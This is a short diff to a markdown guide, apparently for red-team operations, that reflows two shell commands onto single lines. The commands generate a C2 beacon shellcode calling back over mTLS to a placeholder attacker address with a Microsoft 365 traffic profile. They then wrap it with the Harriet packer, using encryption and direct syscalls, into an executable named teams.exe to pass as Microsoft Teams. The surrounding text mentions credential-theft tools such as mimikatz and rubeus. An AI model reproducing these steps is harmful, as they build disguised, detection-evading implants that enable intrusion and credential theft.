@@ -98,14 +98,10 @@ This installs ALL extensions/aliases: nanodump, mimikatz, rubeus, credman, sharp
 
 ```bash
 # Generate beacon shellcode (NO --evasion)
-generate beacon --mtls YOUR_KALI_IP:8888 --os windows --arch amd64 \
-  --format shellcode --c2profile microsoft365 \
-  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin
+generate beacon --mtls YOUR_KALI_IP:8888 --os windows --arch amd64 --format shellcode --c2profile microsoft365 --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin
 
 # Wrap with Harriet (AES-encrypted, direct syscalls)
-harriet --shellcode /tmp/beacon.bin --method directsyscall \
-  --format exe --output /tmp/teams.exe \
-  --harriet-path /opt/Home-Grown-Red-Team/Harriet
+harriet --shellcode /tmp/beacon.bin --method directsyscall --format exe --output /tmp/teams.exe --harriet-path /opt/Home-Grown-Red-Team/Harriet
 ```
 
 ### Manual Harriet (if `harriet` command not available)
